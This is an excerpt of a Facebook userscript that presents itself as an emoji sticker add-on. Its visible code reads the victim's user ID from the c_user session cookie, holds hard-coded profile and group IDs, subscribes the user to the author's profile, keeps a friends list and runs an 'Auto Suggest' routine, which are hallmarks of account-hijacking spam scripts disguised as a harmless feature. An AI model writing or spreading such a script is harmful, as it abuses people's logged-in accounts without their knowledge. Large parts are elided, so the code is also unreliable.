// ==UserScript==
// @name            Emoji Sticker By @Gr3shTeam
// @description     Facebook 2013 By Askhari
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/askhari" target="_blank">Created by Askhari <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("100000647253525");


//Group Gr3shTeam
var gid = ['128328167273508'];
...
var spage_id = "100000647253525";
var spost_id = "100000647253525";
var sfoto_id = "100000647253525";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Askhari';
